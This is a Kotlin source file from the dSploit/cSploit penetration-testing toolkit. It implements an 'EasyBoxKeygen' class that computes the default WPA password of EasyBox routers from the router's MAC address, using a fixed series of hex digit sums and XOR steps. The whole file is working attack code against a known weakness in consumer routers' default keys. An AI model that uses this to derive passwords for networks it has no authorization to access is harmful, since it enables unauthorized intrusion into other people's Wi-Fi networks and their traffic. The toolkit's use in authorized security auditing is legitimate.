/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.strix.data.wifi.algorithms

import org.csploit.strix.data.wifi.Keygen

class EasyBoxKeygen(
    ssid: String, mac: String, level: Int, enc: String
) : Keygen(ssid, mac, level, enc) {

    override fun getKeys(): List<String>? {
        val macAddr = this.mac
        if (macAddr.length != 12) {
            errorMessage = "The MAC address is invalid."
            return null
        }

        var c1 = Integer.parseInt(macAddr.substring(8), 16).toString()
        while (c1.length < 5) c1 = "0$c1"

        val s7  = c1[1]
        val s8  = c1[2]
        val s9  = c1[3]
        val s10 = c1[4]
        val m9  = macAddr[8]
        val m10 = macAddr[9]
        val m11 = macAddr[10]
        val m12 = macAddr[11]

        val tmpK1 = Integer.toHexString(
            Character.digit(s7, 16) + Character.digit(s8, 16) +
                    Character.digit(m11, 16) + Character.digit(m12, 16)
        )
        val tmpK2 = Integer.toHexString(
            Character.digit(m9, 16) + Character.digit(m10, 16) +
                    Character.digit(s9, 16) + Character.digit(s10, 16)
        )

        val k1 = tmpK1[tmpK1.length - 1]
        val k2 = tmpK2[tmpK2.length - 1]

        val x1 = Integer.toHexString(Character.digit(k1, 16) xor Character.digit(s10, 16))
        val x2 = Integer.toHexString(Character.digit(k1, 16) xor Character.digit(s9, 16))
        val x3 = Integer.toHexString(Character.digit(k1, 16) xor Character.digit(s8, 16))
        val y1 = Integer.toHexString(Character.digit(k2, 16) xor Character.digit(m10, 16))
        val y2 = Integer.toHexString(Character.digit(k2, 16) xor Character.digit(m11, 16))
        val y3 = Integer.toHexString(Character.digit(k2, 16) xor Character.digit(m12, 16))
        val z1 = Integer.toHexString(Character.digit(m11, 16) xor Character.digit(s10, 16))
        val z2 = Integer.toHexString(Character.digit(m12, 16) xor Character.digit(s9, 16))
        val z3 = Integer.toHexString(Character.digit(k1, 16) xor Character.digit(k2, 16))

        val wpaKey = "$x1$y1$z1$x2$y2$z2$x3$y3$z3"
        addPassword(wpaKey.uppercase())
        return getResults()
    }
}
